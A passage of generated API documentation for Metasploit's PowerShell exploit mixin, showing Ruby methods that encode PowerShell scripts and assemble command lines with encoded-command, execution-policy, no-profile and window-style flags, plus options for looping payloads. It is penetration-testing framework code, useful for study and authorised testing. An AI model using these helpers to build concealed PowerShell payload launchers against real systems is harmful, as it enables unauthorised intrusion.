    <span class='id identifier rubyid_mod_method'>mod_method</span> <span class='op'>=</span> <span class='id identifier rubyid_k'>k</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>::</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_last'>last</span><span class='period'>.</span><span class='id identifier rubyid_intern'>intern</span>
    <span class='id identifier rubyid_psh'>psh</span><span class='period'>.</span><span class='id identifier rubyid_send'>send</span><span class='lparen'>(</span><span class='id identifier rubyid_mod_method'>mod_method</span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_psh'>psh</span><span class='period'>.</span><span class='id identifier rubyid_compress_code'>compress_code</span><span class='lparen'>(</span><span class='id identifier rubyid_eof'>eof</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="encode_script-instance_method">
  
    - (<tt>String</tt>) <strong>encode_script</strong>(script_in) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Return an encoded powershell script Will invoke PSH modifiers as enabled</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>script_in</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Script contents</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Encoded script</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


29
30
31
32
33
34
35
36
37
38
39</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/powershell.rb', line 29</span>

<span class='kw'>def</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_script_in'>script_in</span><span class='rparen'>)</span>
  <span class='comment'># Build script object
</span>  <span class='id identifier rubyid_psh'>psh</span> <span class='op'>=</span> <span class='const'>PowershellScript</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_script_in'>script_in</span><span class='rparen'>)</span>
  <span class='comment'># Invoke enabled modifiers
</span>  <span class='id identifier rubyid_datastore'>datastore</span><span class='period'>.</span><span class='id identifier rubyid_select'>select</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_k'>k</span><span class='comma'>,</span> <span class='id identifier rubyid_v'>v</span><span class='op'>|</span> <span class='id identifier rubyid_k'>k</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^Powershell::(strip|sub)</span><span class='regexp_end'>/</span></span> <span class='kw'>and</span> <span class='id identifier rubyid_v'>v</span> <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_keys'>keys</span><span class='period'>.</span><span class='id identifier rubyid_map'>map</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_k'>k</span><span class='op'>|</span>
    <span class='id identifier rubyid_mod_method'>mod_method</span> <span class='op'>=</span> <span class='id identifier rubyid_k'>k</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>::</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_last'>last</span><span class='period'>.</span><span class='id identifier rubyid_intern'>intern</span>
    <span class='id identifier rubyid_psh'>psh</span><span class='period'>.</span><span class='id identifier rubyid_send'>send</span><span class='lparen'>(</span><span class='id identifier rubyid_mod_method'>mod_method</span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_psh'>psh</span><span class='period'>.</span><span class='id identifier rubyid_encode_code'>encode_code</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate_psh_args-instance_method">
  
    - (<tt>String</tt>) <strong>generate_psh_args</strong>(opts) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generate arguments for the powershell command The format will be have no
space at the start and have a space afterwards e.g. “-Arg1 x -Arg -Arg x ”</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>opts</span>
      
      
        <span class='type'>(<tt>Hash</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The options to generate the command line</p>
</div>
      
    </li>
  
</ul>

  
    
    
    <p class="tag_title">Options Hash (<tt>opts</tt>):</p>
    <ul class="option">
      
        <li>
          <span class="name">:shorten</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Whether to shorten the powershell arguments (v2.0 or greater)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:encodedcommand</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Powershell script as an encoded command (-EncodedCommand)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:executionpolicy</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The execution policy (-ExecutionPolicy)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:inputformat</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The input format (-InputFormat)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:file</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The path to a powershell file (-File)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:noexit</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Whether to exit powershell after execution (-NoExit)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:nologo</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Whether to display the logo (-NoLogo)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:noninteractive</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Whether to load a non interactive powershell (-NonInteractive)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:mta</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Whether to run as Multi-Threaded Apartment (-Mta)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:outputformat</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The output format (-OutputFormat)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:sta</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Whether to run as Single-Threaded Apartment (-Sta)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:noprofile</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Whether to use the current users powershell profile (-NoProfile)</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:windowstyle</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The window style to use (-WindowStyle)</p>
</div>
          
        </li>
      
    </ul>
  

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Powershell command arguments</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/powershell.rb', line 118</span>

<span class='kw'>def</span> <span class='id identifier rubyid_generate_psh_args'>generate_psh_args</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
  <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span> <span class='kw'>unless</span> <span class='id identifier rubyid_opts'>opts</span>

  <span class='kw'>unless</span> <span class='id identifier rubyid_opts'>opts</span><span class='period'>.</span><span class='id identifier rubyid_key?'>key?</span> <span class='symbol'>:shorten</span>
    <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:shorten</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::method</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>old</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'> </span><span class='tstring_end'>&#39;</span></span>
  <span class='id identifier rubyid_opts'>opts</span><span class='period'>.</span><span class='id identifier rubyid_each_pair'>each_pair</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_arg'>arg</span><span class='comma'>,</span> <span class='id identifier rubyid_value'>value</span><span class='op'>|</span>
    <span class='kw'>case</span> <span class='id identifier rubyid_arg'>arg</span>
    <span class='kw'>when</span> <span class='symbol'>:encodedcommand</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-EncodedCommand </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_value'>value</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:executionpolicy</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-ExecutionPolicy </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_value'>value</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:inputformat</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-InputFormat </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_value'>value</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:file</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-File </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_value'>value</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:noexit</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-NoExit </span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:nologo</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-NoLogo </span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:noninteractive</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-NonInteractive </span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:mta</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-Mta </span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:outputformat</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-OutputFormat </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_value'>value</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:sta</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-Sta </span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:noprofile</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-NoProfile </span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>when</span> <span class='symbol'>:windowstyle</span>
      <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-WindowStyle </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_value'>value</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span>  <span class='id identifier rubyid_value'>value</span>
    <span class='kw'>end</span>
  <span class='kw'>end</span>

  <span class='comment'># Command must be last (unless from stdin - etc)
</span>  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:command</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-Command </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:command</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>end</span>

  <span class='comment'># Shorten arg if PSH 2.0+
</span>  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:shorten</span><span class='rbracket'>]</span>
    <span class='comment'># Invoke-Command and Out-File require these options to have
</span>    <span class='comment'># an additional space before to prevent Powershell code being
</span>    <span class='comment'># mangled.
</span>    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'> -Command </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'> -c </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-EncodedCommand </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-e </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-ExecutionPolicy </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-ep </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'> -File </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'> -f </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-InputFormat </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-i </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-NoExit </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-noe </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-NoLogo </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-nol </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-NoProfile </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-nop </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-NonInteractive </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-noni </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-OutputFormat </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-o </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-Sta </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-s </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_arg_string'>arg_string</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-WindowStyle </span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-w </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='comment'># Strip off first space character
</span>  <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>=</span> <span class='id identifier rubyid_arg_string'>arg_string</span><span class='lbracket'>[</span><span class='int'>1</span><span class='op'>..</span><span class='op'>-</span><span class='int'>1</span><span class='rbracket'>]</span>
  <span class='comment'># Remove final space character
</span>  <span class='id identifier rubyid_arg_string'>arg_string</span> <span class='op'>=</span> <span class='id identifier rubyid_arg_string'>arg_string</span><span class='lbracket'>[</span><span class='int'>0</span><span class='op'>..</span><span class='op'>-</span><span class='int'>2</span><span class='rbracket'>]</span> <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_arg_string'>arg_string</span><span class='lbracket'>[</span><span class='op'>-</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'> </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>

  <span class='id identifier rubyid_arg_string'>arg_string</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate_psh_command_line-instance_method">
  
    - (<tt>String</tt>) <strong>generate_psh_command_line</strong>(opts) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generate a powershell command line, options are passed on to
generate_psh_args</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>opts</span>
      
      
        <span class='type'>(<tt>Hash</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The options to generate the command line</p>
</div>
      
    </li>
  
</ul>

  
    
    
    <p class="tag_title">Options Hash (<tt>opts</tt>):</p>
    <ul class="option">
      
        <li>
          <span class="name">:path</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Path to the powershell binary</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:no_full_stop</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Whether powershell binary should include .exe</p>
</div>
          
        </li>
      
    </ul>
  

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Powershell command line with arguments</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


71
72
73
74
75
76
77
78
79
80
81
82
83
84
85</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/powershell.rb', line 71</span>

<span class='kw'>def</span> <span class='id identifier rubyid_generate_psh_command_line'>generate_psh_command_line</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:path</span><span class='rbracket'>]</span> <span class='kw'>and</span> <span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:path</span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='op'>-</span><span class='int'>1</span><span class='comma'>,</span> <span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\\</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:path</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\\</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:no_full_stop</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_binary'>binary</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>powershell</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_binary'>binary</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>powershell.exe</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_args'>args</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_psh_args'>generate_psh_args</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>

  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:path</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_binary'>binary</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_args'>args</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="initialize-instance_method">
  
    - (<tt>Object</tt>) <strong>initialize</strong>(info = {}) 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


8
9
10
11
12
13
14
15
16
17
18
19
20</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/powershell.rb', line 8</span>

<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='kw'>super</span>
  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
    <span class='lbracket'>[</span>
      <span class='const'>OptBool</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::persist</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Run the payload in a loop</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>false</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'>OptInt</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::prepend_sleep</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Prepend seconds of sleep</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'>OptBool</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::strip_comments</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Strip comments</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>true</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'>OptBool</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::strip_whitespace</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Strip whitespace</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>false</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
